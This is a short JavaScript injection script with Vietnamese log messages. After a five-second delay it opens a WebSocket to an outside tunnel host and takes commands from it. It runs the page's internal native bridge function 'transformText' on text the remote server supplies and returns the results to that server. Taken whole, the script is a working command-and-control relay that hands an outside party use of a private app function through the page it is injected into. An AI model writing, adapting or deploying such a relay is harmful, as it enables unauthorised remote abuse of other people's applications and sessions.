setTimeout(() => {
  let clientId = null;

  const socket = new WebSocket("wss://results-amd-common-wholesale.trycloudflare.com/ws");

  socket.onmessage = async (event) => {
    const data = JSON.parse(event.data);

    if (data.type === "init") {
      clientId = data.id;
      console.log("Máy A được gán ID:", clientId);
      return;
    }

    if (data.cmd === "run") {
      try {
        const result = await transformTextHandler(data.args);
        socket.send(JSON.stringify({
          clientId: clientId,
          id: data.id,
          result: result
        }));
      } catch (err) {
        socket.send(JSON.stringify({
          clientId: clientId,
          id: data.id,
          error: err.toString()
        }));
      }
    }
  };

  function transformTextHandler(inputText) {
    return new Promise((resolve, reject) => {
      window.bridgeCallHandler(
        "transformText",
        { text: inputText, method: 3 },
        function (response) {
          const data = response.data;
          const errorMessage = response.errorMessage;
          const result = data ? data.result : undefined;

          if (result) {
            resolve(result);
          } else {
            reject(errorMessage || "Unknown error");
          }
        }
      );
    });
  }

  console.log("✅ Inject code sau 5 giây");
}, 5000);
